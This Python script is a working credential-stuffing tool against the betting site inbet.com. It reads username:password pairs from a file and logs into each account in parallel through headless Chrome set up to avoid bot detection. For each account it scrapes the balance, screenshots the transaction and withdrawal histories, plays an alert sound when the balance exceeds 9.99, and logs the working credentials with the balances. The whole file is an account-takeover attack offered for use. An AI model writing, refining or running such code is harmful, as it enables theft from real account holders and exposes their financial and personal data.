import winsound  # For playing sound on Windows
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
import time
import traceback
import os
from concurrent.futures import ThreadPoolExecutor
import threading
import keyboard  # for detecting keypresses
import sys

stop_flag = False

def emergency_stop_listener():
    global stop_flag
    buffer = []

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and event.name == 's':
            buffer.append(time.time())
            # Remove keypresses older than 3 seconds
            buffer = [t for t in buffer if time.time() - t < 3]
            if len(buffer) >= 5:
                print("\n[EMERGENCY STOP] 's' pressed 5 times. Stopping script.")
                stop_flag = True
                os._exit(0)  # Force quit entire script including threads

def sanitize_filename(text):
    """
    Replace unsafe filename characters with underscores.
    """
    return re.sub(r'[\\/:*?"<>|]', '_', text)

def safe_click(driver, element, username, password, retries=3):
    """
    Tries clicking an element multiple times while removing possible overlays.
    Returns True if click succeeded, False otherwise.
    """
    for attempt in range(1, retries + 1):
        try:
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
            time.sleep(0.5)
            element.click()
            print(f"[{username}:{password}] [INFO] Click succeeded on attempt {attempt}.")
            return True
        except Exception as e:
            if attempt == retries:
                print(f"[{username}:{password}] [ERROR] Click failed after {retries} attempts: {e}")
            else:
                print(f"[{username}:{password}] [INFO] Click intercepted on attempt {attempt}. Retrying...")
            # Try removing overlays
            try:
                driver.execute_script("""
                    document.querySelectorAll(
                        '.modal, .modal-backdrop, .fade.show, .d-flex, .wh-100'
                    ).forEach(el => el.remove());
                """)
                print(f"[{username}:{password}] [INFO] Removed potential overlays.")
            except Exception:
                pass
            time.sleep(1)
    print(f"[{username}:{password}] [ERROR] Could not click element after {retries} attempts.")
    return False

def read_credentials(file_path):
    """Reads a file with each line in the format username:password."""
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials = file.readlines()
    return [line.strip().split(':') for line in credentials]

def init_driver(block_images=True):
    """Initialize an undetected Chrome WebDriver with specified options."""
    options = uc.ChromeOptions()
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--log-level=3")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--headless=new")  # <-- Headless mode here

    if block_images:
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

    version_main = 137

    driver = uc.Chrome(options=options, version_main=version_main)
    driver.set_window_size(1920, 1080)  # Important for rendering layout in headless mode
    return driver

def login(credentials):
    """Perform the login process for a single username/password pair."""
    username, password = credentials
    driver = init_driver()

    try:
        driver.get(login_page_url)
        wait = WebDriverWait(driver, 30)
        
        # Step 1: Accept Cookies
        try:
            accept_cookies_btn = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-qid="accept-cookies"]'))
            )
            try:
                accept_cookies_btn.click()
            except Exception:
                # Fallback to JavaScript click
                driver.execute_script("arguments[0].click();", accept_cookies_btn)
            # print(f"[{username}:{password}] [INFO] Cookies accepted for {username}.")
        except Exception:
            print(f"[WARNING] Accept Cookies button not found or not clickable for {username}. Continuing...")

        # Step 2: Click Login Button to Open Login Window
        try:
            login_button = wait.until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div[2]/div/nav/div/div/div[3]/div[3]/div[2]"))
            )
            login_button.click()
            # print(f"[{username}:{password}] [INFO] Login window opened for {username}.")
        except Exception:
            # print(f"[ERROR] Login button not found or not clickable for {username}.")
            return

        # Step 3: Fill in the Username
        try:
            username_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[1]/div/div/div/input")
                )
            )
            username_field.send_keys(username)
            # print(f"[{username}:{password}] [INFO] Username entered for {username}.")
        except Exception:
            # print(f"[ERROR] Username field not found for {username}.")
            return

        # Step 4: Fill in the Password
        try:
            password_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[2]/div/div/div/input")
                )
            )
            password_field.send_keys(password)
            # print(f"[{username}:{password}] [INFO] Password entered for {username}.")
        except Exception:
            # print(f"[ERROR] Password field not found for {username}.")
            return

        # Step 5: Click the Login Button
        try:
            submit_button = wait.until(
                EC.element_to_be_clickable(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/button")
                )
            )
            submit_button.click()
            # print(f"[{username}:{password}] [INFO] Login button clicked for {username}.")
        except Exception:
            # print(f"[ERROR] Submit button not found or not clickable for {username}.")
            return
            
        # Initialize with default values to avoid UnboundLocalError
        formatted_amount = '0.00'

        balance_found = False

        # Step 6a: Extract Balance
        try:
            success_elm = wait.until(
                EC.visibility_of_element_located(
                    (By.CSS_SELECTOR, "div.d-flex-as-je.nav-user.nav-user__logged-in")
                )
            )
            success_text = success_elm.text
            amount_match = re.search(r'\d+(?:[.,]\d+)?', success_text)
            if amount_match:
                amount_str = amount_match.group().replace(',', '.')
                try:
                    amount = float(amount_str)
                    formatted_amount = f"{amount:.2f}"
                    balance_found = True
                except ValueError:
                    pass  # Keep default
        except Exception:
            print(f"[{username}:{password}] [INFO] Balance element NOT found for {username}.")

        # Step 6b: Close popup window if present
        try:
            close_btn = wait.until(
                EC.element_to_be_clickable((By.XPATH, '//div[@data-qid="gmf-modal-close"]'))
            )
            close_btn.click()
            print(f"[{username}:{password}] [INFO] Popup closed.")
            time.sleep(1)

            # Remove any leftover modal backdrops
            try:
                driver.execute_script("""
                    const backdrops = document.querySelectorAll('.modal-backdrop');
                    backdrops.forEach(el => el.remove());
                """)
                print(f"[{username}:{password}] [INFO] Removed modal backdrop via JavaScript.")
            except Exception as e:
                print(f"[{username}:{password}] [WARNING] Failed to remove modal backdrop: {e}")

            time.sleep(1)

        except Exception:
            # No popup found - silently continue
            pass
        
        # Step 7: Navigate directly to history page
        try:
            history_url = "https://inbet.com/my-account/bank?tab=history"
            driver.get(history_url)
            print(f"[{username}:{password}] [INFO] Navigated to {history_url}")

            # Give time for page to load
            time.sleep(3)

            # Remove modal backdrop again after navigation
            try:
                driver.execute_script("""
                    const backdrops = document.querySelectorAll('.modal-backdrop');
                    backdrops.forEach(el => el.remove());
                """)
                print("[INFO] Removed modal backdrop after navigating to history.")
            except Exception as e:
                print(f"[WARNING] Failed to remove modal backdrop after navigating: {e}")

            time.sleep(1)
        except Exception as e:
            print(f"[ERROR] Failed to navigate to history page: {e}")

        # Step 8: Take second screenshot
        safe_name = sanitize_filename(f"{username}:{password}_history.png")
        driver.save_screenshot(safe_name)
        print(f"[{username}:{password}] [INFO] Screenshot saved as {safe_name}")

        # Step 9: Click Withdrawal History tab and take another screenshot
        try:
            withdrawal_tab = wait.until(
                EC.element_to_be_clickable((By.XPATH, '//div[@data-qid="withdrawalHistoryTab"]'))
            )
            
            clicked = safe_click(driver, withdrawal_tab, username, password)
            
            if clicked:
                time.sleep(2)

                # Remove any backdrop after click
                try:
                    driver.execute_script("""
                        const backdrops = document.querySelectorAll('.modal-backdrop');
                        backdrops.forEach(el => el.remove());
                    """)
                    print(f"[{username}:{password}] [INFO] Removed modal backdrop after clicking withdrawal history tab.")
                except Exception as e:
                    print(f"[{username}:{password}] [WARNING] Failed to remove modal backdrop after clicking withdrawal tab: {e}")

                safe_name_withdraw = sanitize_filename(f"{username}:{password}_withdraw_history.png")
                if driver.session_id is not None:
                    driver.save_screenshot(safe_name_withdraw)
                    print(f"[{username}:{password}] [INFO] Screenshot saved as {safe_name_withdraw}")
                else:
                    print(f"[{username}:{password}] [ERROR] Cannot save screenshot: session closed.")
            else:
                print(f"[{username}:{password}] [ERROR] Skipping screenshot because click failed.")

        except Exception as e:
            print(f"[{username}:{password}] [ERROR] Failed to click 'История на изплащанията' tab: {e}")

        # Convert to float/int for comparison
        balance_value = float(formatted_amount.replace(',', '.'))

        # Play sound if balance > 9.99
        if balance_value > 9.99:
            try:
                winsound.PlaySound(r"C:\Users\petar\Desktop\inbet\minet.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)
            except:
                print("[WARNING] Could not play sound.")

        # Log only if balance
        if balance_found:
            with open(success_logins_file, 'a', encoding='utf-8') as file:
                file.write(f"{username}:{password} - Balance: {formatted_amount}\n")

    except Exception as e:
        traceback.print_exc()

    finally:
        driver.quit()

def main():
    global login_page_url, success_logins_file, stop_flag

    credentials_file = 'credentials.txt'
    success_logins_file = r"C:\Users\petar\Desktop\inbet\balance_and_bets_sounds.txt"
    os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)

    login_page_url = "https://inbet.com/sports"
    credentials = read_credentials(credentials_file)
    # Start the emergency stop thread
    listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
    listener_thread.start()

    max_workers = 11
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(login, credentials)

if __name__ == "__main__":
    main()